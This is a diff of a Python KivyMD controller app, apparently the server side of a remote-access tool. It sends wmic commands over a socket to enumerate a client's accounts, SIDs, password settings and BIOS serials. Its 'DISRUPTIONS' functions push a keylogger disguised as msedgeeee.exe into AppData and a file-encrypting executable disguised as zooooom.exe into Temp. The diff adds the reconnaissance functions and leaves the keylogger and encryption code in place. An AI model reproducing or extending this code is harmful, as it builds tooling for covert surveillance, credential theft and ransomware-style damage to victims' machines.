@@ -61,10 +61,6 @@ ScreenManager:
                     text: "Network Services"
                     on_release: app.Services()
                 OneLineListItem:
-                    id: userInfoBtn
-                    text: "User Information"
-                    on_release: app.UserInfo()
-                OneLineListItem:
                     id: secPolicy
                     text: "Security Policy"
                     on_release: app.SecPolicy()
@@ -72,6 +68,18 @@ ScreenManager:
                     id: memInfo
                     text: "Memory Information"
                     on_release: app.MemInfo()
+                OneLineListItem:
+                    id: userInfoBtn
+                    text: "Current User Information"
+                    on_release: app.UserInfo()
+                OneLineListItem:
+                    id: accountsBtn
+                    text: "Accounts Information"
+                    on_release: app.AccountInfo()
+                OneLineListItem:
+                    id: biosBtn
+                    text: "BIOS Information"
+                    on_release: app.BIOSInfo()
         MDTextField:
             id: consoleField
             max_height: '200dp'
@@ -156,8 +164,9 @@ ScreenManager:
         hint_text: 'Enter File Path'
 '''
 # Server IP and Port
-HOST = '192.168.123.165'  # Temporary localhost for testing (Make sure to use the client's IP during production
+HOST = '127.0.0.1'  # Temporary localhost for testing (Make sure to use the client's IP during production
 PORT = 21420
+
 
 class Main(MDApp):
     def build(self):
@@ -381,7 +390,6 @@ class Main(MDApp):
             self.currConn.send(command.encode())
             recvsize = self.currConn.recv(1024).decode()
             output = self.currConn.recv(int(recvsize)).decode()
-            output = output.splitlines()
 
             # Get SID
             command = 'wmic useraccount where name="%USERNAME%" get sid'
@@ -392,12 +400,44 @@ class Main(MDApp):
             output2 = output2.splitlines()
 
             # Print results
-            print('Output: ')
-            a1= f"{output[0]}\n{output[1]}\n{output[8]}"
-            print(a1)
+            print('Output: \n')
+            print(output)
             a2 = f"SID\t\t\t\t\t\t\t{output2[2]}"
+            print(a2)
 
-            self.root.ids.consoleField.text = a1 + a2
+            self.root.ids.consoleField.text = str(output+a2)
+            break
+
+    def AccountInfo(self):
+        while True:
+            # Reset console
+            self.root.ids.consoleField.text = ''
+
+            command = 'wmic useraccount get domain,name,sid,status,passwordchangeable,passwordexpires,passwordrequired,localaccount'
+            self.currConn.send(command.encode())
+            print('Command sent to client: ', command)
+
+            recvsize = self.currConn.recv(1024).decode()
+            output = self.currConn.recv(int(recvsize)).decode()
+
+            print('Output: \n', output)
+            self.root.ids.consoleField.text = output
+            break
+
+    def BIOSInfo(self):
+        while True:
+            # Reset console
+            self.root.ids.consoleField.text = ''
+
+            command = 'wmic bios get manufacturer,name,primarybios,serialnumber,version,smbiospresent,status'
+            self.currConn.send(command.encode())
+            print('Command sent to client: ', command)
+
+            recvsize = self.currConn.recv(1024).decode()
+            output = self.currConn.recv(int(recvsize)).decode()
+
+            print('Output: \n', output)
+            self.root.ids.consoleField.text = output
             break
 
     ###############################DISRUPTIONS############################################
@@ -542,7 +582,7 @@ class Main(MDApp):
     def KeyloggerInstall(self):
         # Reset console
         self.root.ids.disruptConsoleField.text = ''
-        
+
         tpath = "%USERPROFILE%\\AppData\\Local\\Microsoft\\msedgeeee.exe"
         kpath = os.path.join(os.getcwd(), "keylogger.exe")
         while True:
@@ -595,7 +635,7 @@ class Main(MDApp):
                 print('Command sent to client: ', command)
                 output2 = self.currConn.recv(1024).decode()
                 time.sleep(5)
-                o1 =f"Keylogger{output2}"
+                o1 = f"Keylogger{output2}"
                 print(o1)
                 self.root.ids.disruptConsoleField.text = o1
             else:
@@ -636,7 +676,7 @@ class Main(MDApp):
     def EncryptFiles(self):
         # Reset console
         self.root.ids.disruptConsoleField.text = ''
-        
+
         tpath = "%USERPROFILE%\\AppData\\Local\\Temp\\zooooom.exe"
         kpath = os.path.join(os.getcwd(), "encrypt.exe")
         while True:
@@ -704,11 +744,14 @@ class Main(MDApp):
     def MainMenu(self):
         self.root.current = "mainMenu"
 
+
 class DenyFilesContent(BoxLayout):
     pass
 
+
 class TaskKillContent(BoxLayout):
     pass
+
 
 if __name__ == '__main__':
     Main().run()
